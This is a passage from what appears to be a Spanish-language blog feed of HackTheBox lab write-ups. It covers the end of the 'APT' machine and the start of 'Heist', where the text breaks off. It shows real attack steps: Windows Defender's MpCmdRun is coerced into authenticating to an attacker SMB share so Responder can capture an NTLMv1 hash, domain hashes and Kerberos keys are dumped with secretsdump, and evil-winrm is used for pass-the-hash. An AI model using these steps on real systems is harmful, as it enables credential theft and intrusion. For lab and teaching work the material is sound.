    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>ON]
    Force ESS downgrade        <span class="o">[</span>ON]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.222]
    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...
</span></code></pre></div></div>

<ul>
  <li>Algo que podemos hacer para hacer la autenticación como el <code class="language-plaintext highlighter-rouge">defender</code> esta habilitado podemos hacer que haga un escaneo de un recurso compartido a nivel de red atreves del <code class="language-plaintext highlighter-rouge">MpCmdRun.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       11/21/2016   1:53 AM                en-US
d-----        9/24/2020   9:15 AM                platform
<span class="nt">-a----</span>        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof
<span class="nt">-a----</span>         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM          21004 AmStatusInstall.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof
<span class="nt">-a----</span>         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe
<span class="nt">-a----</span>        3/28/2017   6:23 AM         224256 DataLayer.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM        1514688 DbgHelp.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM         724480 EppManifest.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM            361 FepUnregister.mof
<span class="nt">-a----</span>         3/4/2021   5:03 AM          86528 MpAsDesc.dll
<span class="nt">-a----</span>         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll
<span class="nt">-a----</span>         3/4/2021   4:55 AM         928768 MpClient.dll
<span class="nt">-a----</span>         3/4/2021   5:42 AM         377648 MpCmdRun.exe
<span class="nt">-a----</span>         3/4/2021   4:58 AM         335360 MpCommu.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM         113152 MpEvMsg.dll
<span class="nt">-a----</span>         3/4/2021   5:01 AM         101888 MpOAV.dll
<span class="nt">-a----</span>         1/7/2021  10:55 PM         178176 MpProvider.dll
<span class="nt">-a----</span>         3/4/2021   4:57 AM         526336 MpRtp.dll
<span class="nt">-a----</span>         3/4/2021   4:55 AM        2000384 MpSvc.dll
<span class="nt">-a----</span>         3/4/2021   5:02 AM          76288 MsMpCom.dll
<span class="nt">-a----</span>         3/4/2021   5:42 AM          97184 MsMpEng.exe
<span class="nt">-a----</span>         3/4/2021   5:05 AM           4608 MsMpLics.dll
<span class="nt">-a----</span>         3/4/2021   5:03 AM          53248 NisLog.dll
<span class="nt">-a----</span>         3/4/2021   5:48 AM         339400 NisSrv.exe
<span class="nt">-a----</span>         3/4/2021   5:03 AM          66048 NisWfp.dll
<span class="nt">-a----</span>        4/28/2017  12:52 AM         551424 ProtectionManagement.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM          57424 ProtectionManagement.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM           2570 ProtectionManagement_Uninstall.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM         156864 SymSrv.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM              1 SymSrv.yes
<span class="nt">-a----</span>        7/16/2016   2:12 PM           1091 ThirdPartyNotices.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt;
</code></pre></div></div>

<ul>
  <li>Con esto vamos a escanear un archivo de un recurso compartido a nivel de red de nosotros que no es obligatorio que exista solo es para hacer la autenticación y robar el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.222<span class="se">\y</span>o
</code></pre></div></div>

<ul>
  <li>Nos llega el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>ON]
    Force ESS downgrade        <span class="o">[</span>ON]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.222]
    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...

[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
</span></code></pre></div></div>

<ul>
  <li>
    <p>Podríamos usar esta web para crackear el hash pero esta en mantenimiento <a href="https://crack.sh/get-cracking/">https://crack.sh/get-cracking/</a> y como no esta operativa no podemos crackear el hash así yo le pedí a mi compañero que en su momento hiso la maquina que me pasara el hash por que la pagina web estaba operativa cuando el la hiso.</p>
  </li>
  <li>
    <p>Con el hash podemos <code class="language-plaintext highlighter-rouge">dumpear</code> todos los hashes de los usuarios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="s1">'htb.local/APT$@apt'</span> <span class="nt">-hashes</span> :d167c3238864b12f5f82feae86a7f798
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT<span class="nv">$:</span>aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT<span class="nv">$:</span>aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT<span class="nv">$:</span>des-cbc-md5:76c45245f104a4bf
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>Ahora teniendo el hash del usuario administrador podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-wirnm</code> y obtener la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'c370bddf384a691d811ff3495e8a72e2'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
c52c0f60732da145b5ca1d4da4a65287
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Heist (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html" rel="alternate" type="text/html" title="HackTheBox - Heist (easy)" /><published>2024-04-13T00:00:00-06:00</published><updated>2024-04-13T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/13/heist.html"><![CDATA[<p><img src="https://labs.hackthebox.com/storage/avatars/131dbaba68b169bd5ff59ac09420b09f.png" alt="busqueda-avatar" /></p>

<p>En este post vamos a estar haciendo la maquina Heist de la plataforma de Hack The Box donde mediante hashes de Cisco Password 7 que crackeamos vamos a hacer un password spray para ver a que usuario pertenece vamos a estar usando impacket-lookupsid para descubrir nuevos usuarios y conectarnos con evil-wirnm ya que el usuario forma parte del grupo Remote Management Users y para la escalada de privilegios mediante strings vamos a analizar un volcado de un PID que esta corriendo Firefox donde las credenciales serán las del usuario Administrador.</p>

<h3 id="portscan"><strong>PortScan</strong></h3>

<ul>
  <li>Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th>Uso</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Escanear todo el rango de puertos (65535) por el protocolo TCP.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Solo queremos ver puertos abiertos.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Para que nos reporte los puertos que vaya encontrando por la consola.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Para que no aplique resolución DNS.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Esto es para indicarle que omita el descubrimiento de hosts.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Para exportar la salida en formato Greppable.</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.116.26 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-13 14:27 CST
Initiating SYN Stealth Scan at 14:27
Scanning 10.129.116.26 <span class="o">[</span>65535 ports]
Discovered open port 49669/tcp on 10.129.116.26
Discovered open port 5985/tcp on 10.129.116.26
Discovered open port 80/tcp on 10.129.116.26
Discovered open port 135/tcp on 10.129.116.26
Discovered open port 445/tcp on 10.129.116.26
Increasing send delay <span class="k">for </span>10.129.116.26 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
Completed SYN Stealth Scan at 14:27, 52.89s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.129.116.26
Host is up, received user-set <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2024-04-13 14:27:02 CST <span class="k">for </span>53s
Not shown: 65530 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
</code></pre></div></div>

<ul>
  <li>Ahora usamos la función <code class="language-plaintext highlighter-rouge">extractPorts</code> para copear los puertos abiertos a la <code class="language-plaintext highlighter-rouge">clipboard</code> y escanear los servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap which extractPorts
extractPorts <span class="o">()</span> <span class="o">{</span>
	<span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
	<span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">cat </span>extractPorts.tmp
	<span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>La ejecutamos y nos copea los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap extractPorts allPorts

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...

	<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.129.116.26
	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,135,445,5985,49669

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<ul>
  <li>Ahora seguimos con el escaneo de los servicios de los puertos abiertos.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Uso</th>
      <th>Párametro</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos.</td>
      <td>-sCV</td>
    </tr>
    <tr>
      <td>Que no lo exporte a un archivo normal.</td>
      <td>-oN</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,5985,49669 10.129.116.26 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-13 14:31 CST
Nmap scan report <span class="k">for </span>10.129.116.26
Host is up <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: <span class="nt">-4s</span>
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-13T20:32:40
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> vemos las tecnologías que esta usando en el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">PHPSESSID</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="n">login</span><span class="p">.</span><span class="nf">php</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="nf">php</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">7</span><span class="p">],</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">PHPSESSID</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.26</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">PasswordField</span><span class="p">[</span><span class="n">login_password</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Support</span> <span class="no">Login</span> <span class="no">Page</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos que nos redirige a un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/1.png" />
</p>

<ul>
  <li>Si observamos en la parte de abajo nos dice <code class="language-plaintext highlighter-rouge">Login as guest</code> si damos <code class="language-plaintext highlighter-rouge">click</code> vemos que funciona correctamente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/2.png" />
</p>

<ul>
  <li>El usuario Hazard nos habla de que ah estado experimentando problemas con su <code class="language-plaintext highlighter-rouge">router cisco</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/3.png" />
</p>

<ul>
  <li>Si vemos el <strong>Attachment</strong> nos muestra el archivo de configuración que nos dice que el usuario <strong>admin</strong> estaba usando.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/4.png" />
</p>

<ul>
  <li>Vemos que mencionan mucho el <code class="language-plaintext highlighter-rouge">password</code> 7.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
</code></pre></div></div>

<ul>
  <li><a href="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html">https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html</a> podemos apoyarnos de ese recurso para poder ver las contraseñas en texto plano simplemente pasándole el hash <code class="language-plaintext highlighter-rouge">0242114B0E143F015F5D1E161713</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/5.png" />
</p>

<ul>
  <li>Esta es del otro hash.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/heist/6.png" />
</p>

<ul>
  <li>Podemos aplicar un <code class="language-plaintext highlighter-rouge">PasswordSpray</code> para probar las credenciales que tenemos y el usuario Hazard.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
admin
rout3r
hazard
</code></pre></div></div>

<ul>
  <li>Si recordamos también nos dan un hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat hash</span>
<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
</code></pre></div></div>

<ul>
